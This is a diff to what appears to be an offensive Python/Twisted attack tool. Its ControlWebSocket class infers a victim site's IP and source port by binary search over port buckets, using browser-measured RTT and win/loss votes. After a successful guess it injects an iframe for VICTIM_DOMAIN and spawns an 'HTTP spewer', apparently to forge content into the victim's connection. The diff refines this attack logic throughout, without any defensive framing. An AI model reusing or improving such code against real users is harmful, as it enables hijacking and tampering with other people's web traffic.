@@ -175,7 +175,15 @@ class ControlWebSocket(Protocol):
 
     def make_iframe(self):
         self.transport.write('iframe')
-        #self.spawnHTTPSpewer() 
+        if (self.spewer_pid == None):
+            self.spawnHTTPSpewer() 
+        reactor.callLater(0.5, self.make_iframe)
+
+    def init_iframe(self):
+        self.transport.write("init_iframe http://%s" % (VICTIM_DOMAIN))
+                        
+        reactor.callLater(1, self.make_iframe)
+
 
     def adjustBucket(self, success):
         """
@@ -194,7 +202,7 @@ class ControlWebSocket(Protocol):
             reactor.stop()
             return
 
-        print 'adjust Bucket (%s, %s, %s)' % (self.min_port, self.mid_port, self.max_port)
+        print 'adjust Bucket (%s, %s, %s) (%s)' % (self.min_port, self.mid_port, self.max_port, success)
 
         if (self.state == STATE_SOURCE_PORT_FINAL):
             if success:
@@ -231,11 +239,9 @@ class ControlWebSocket(Protocol):
                     print 'Sorry, looks like %s was not %s...try again' \
                             % (VICTIM_DOMAIN, VICTIM_SITE_IPS[self.ip_guess_index])
                 return
-
+            
             print 'It was totally it!!!'
-            self.transport.write("init_iframe http://%s" % (VICTIM_DOMAIN))
-                        
-            reactor.callLater(1.5, self.make_iframe)
+            reactor.callLater(1, self.init_iframe)
             self.seq_spew_port = port + 1
 
             #reactor.stop()
@@ -288,6 +294,7 @@ class ControlWebSocket(Protocol):
             (self.min_port, self.max_port) = self.getBucketPortRange() 
             self.mid_port = int((self.min_port + self.max_port) / 2)
         else:
+            print 'cleanupOldWebsocket binary search'
             self.adjustBucket(True)
        
         if (self.seq_spew_port == None): 
@@ -402,14 +409,14 @@ class ControlWebSocket(Protocol):
                         self.bucket = 0
                         #print 'But wait, there\'s more! (index %d' % self.ip_guess_index 
 
+        elif (self.state == STATE_SOURCE_PORT_FINAL or self.state == STATE_IP_DOUBLE_CHECK):
+            self.adjustBucket(we_won)
         else:
             # Doing binary search
             self.votes.append(we_won)
             if len(self.votes) >= 2:
                 we_won = (True in self.votes)
                 self.votes = []
-                self.adjustBucket(we_won)
-            elif (self.state == STATE_SOURCE_PORT_FINAL or self.state == STATE_IP_DOUBLE_CHECK):
                 self.adjustBucket(we_won)
             else:
                 self.incrementBuckets()
@@ -423,6 +430,7 @@ class ControlWebSocket(Protocol):
 
     def handleRTTResult(self, data):
         # the browser has finished measuring the RTT (and win_threshold)
+        print 'RTTResult: %s' % data
         rtt_secs = float(data[len('calmed '):])
         self.RTT = int(rtt_secs * 1000)
         print 'RTT: %f (%d ms)' % (rtt_secs, self.RTT)
@@ -461,6 +469,7 @@ class ControlWebSocket(Protocol):
         
         
         self.NUM_BUCKETS = int((HIGH_PORT - LOW_PORT) / port_guesses + 1)
+        self.NUM_BUCKETS = max(self.NUM_BUCKETS, 15)
         self.PORT_BUCKET_SIZE = (HIGH_PORT - LOW_PORT) / self.NUM_BUCKETS
         print 'moving to %d buckets' % self.NUM_BUCKETS
         
